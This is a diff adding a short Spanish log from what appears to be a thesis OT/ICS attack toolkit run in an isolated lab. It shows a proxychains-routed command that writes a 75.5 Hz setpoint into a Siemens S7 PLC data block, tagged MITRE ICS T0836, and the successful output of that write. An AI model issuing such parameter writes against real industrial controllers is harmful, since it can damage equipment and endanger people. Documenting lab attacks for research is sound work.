@@ -1,0 +1,19 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  Siemens S7 - Escritura de Setpoint (DB1.DBD6, REAL)
+======================================================================
+  Fecha      : 2026-10-09 22:10:44
+  Objetivo   : 192.168.30.10 -> 75.5 Hz
+  MITRE ICS  : T0836
+======================================================================
+$ proxychains python3 -m modules._cli.s7_cli write_setpoint --target 192.168.30.10 --rack 0 --slot 1 --valor 75.5
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.30.10:102  ...  OK
+[+] Conectado correctamente al PLC S7 en 192.168.30.10
+[*] Enviando nuevo Setpoint (75.5 Hz) a DB1.DBD6...
+  [OK] Escritura de Setpoint completada.
+  [*] Setpoint tras escritura: 75.50 Hz
+[+] Sesión S7comm finalizada.
+[=] Código de salida: 0
